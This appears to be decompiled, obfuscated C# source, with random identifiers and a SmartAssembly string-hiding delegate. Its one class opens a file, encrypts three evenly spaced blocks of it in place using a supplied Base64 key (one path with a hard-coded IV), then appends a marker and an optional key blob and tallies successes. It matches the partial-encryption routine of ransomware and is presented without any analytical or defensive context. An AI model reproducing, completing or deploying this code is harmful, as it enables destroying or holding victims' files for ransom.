using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using nLekQTrDWiq;

namespace wawLLalyhHSFm;

internal sealed class xwkLEGVxhadEUV
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int RxYTFbcQRF(long long_0)
	{
		return (int)long_0;
	}

	public static bool ROTZWSZwBsMXoW(string BUrzZZRnNvwx, string InLNmGjJUchTr, string toqePZOEYszDGH, byte[] ssZqbYxDrckDEmF = null, byte[] PpLleFCxnIsms = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(BUrzZZRnNvwx, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = RxYTFbcQRF(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(InLNmGjJUchTr) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(InLNmGjJUchTr) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(InLNmGjJUchTr) * 1024 * 1024) / 10;
				}
				int yNBWQnHroxiRbh = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = oPqqJhMxePk(BUrzZZRnNvwx, fileStream, yNBWQnHroxiRbh, num * i);
					array = (ufSaqXYLSvVxK.ToytCwhuOZ ? LQKLndoDiyu.GrlNceGkOvk(byte_, Convert.FromBase64String(toqePZOEYszDGH), PpLleFCxnIsms) : PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(toqePZOEYszDGH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					dNsmlBQcoLaeOUl(BUrzZZRnNvwx, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (ufSaqXYLSvVxK.TTTJwfHUqgyKmj ? Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107398118)) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399102)) + Convert.ToString(InLNmGjJUchTr) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399102))) : Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107398118)) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399111)) + Convert.ToString(InLNmGjJUchTr) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399111))));
			if (!ufSaqXYLSvVxK.TTTJwfHUqgyKmj)
			{
				using FileStream fileStream2 = new FileStream(BUrzZZRnNvwx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(BUrzZZRnNvwx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(ssZqbYxDrckDEmF, 0, ssZqbYxDrckDEmF.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (ufSaqXYLSvVxK.YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ufSaqXYLSvVxK.ZmxznfzcMXVgTR, getString_0(107386937) + BUrzZZRnNvwx + getString_0(107398073) + ex.Message + getString_0(107396688));
				}
				catch (Exception)
				{
				}
			}
			ufSaqXYLSvVxK.IwoWsCVOvNqeRACr++;
			return false;
		}
		ufSaqXYLSvVxK.OSqubFtEdkqhb++;
		return true;
	}

	public static byte[] oPqqJhMxePk(string HTxxnpymvKekNCN, FileStream dVUSITkhfmFz, int yNBWQnHroxiRbh, int fYesMZSZiOWhHyg = 0)
	{
		byte[] array = new byte[yNBWQnHroxiRbh];
		dVUSITkhfmFz.Position = fYesMZSZiOWhHyg;
		dVUSITkhfmFz.Read(array, 0, yNBWQnHroxiRbh);
		return array;
	}

	public static void dNsmlBQcoLaeOUl(string ncMRNSRcngBL, FileStream qYdzglZIwPjq, byte[] otUNwxXqly, int TUVohluomvGb = 0)
	{
		qYdzglZIwPjq.Position = TUVohluomvGb;
		qYdzglZIwPjq.Write(otUNwxXqly, 0, otUNwxXqly.Length);
	}

	static xwkLEGVxhadEUV()
	{
		Strings.CreateGetStringDelegate(typeof(xwkLEGVxhadEUV));
	}
}
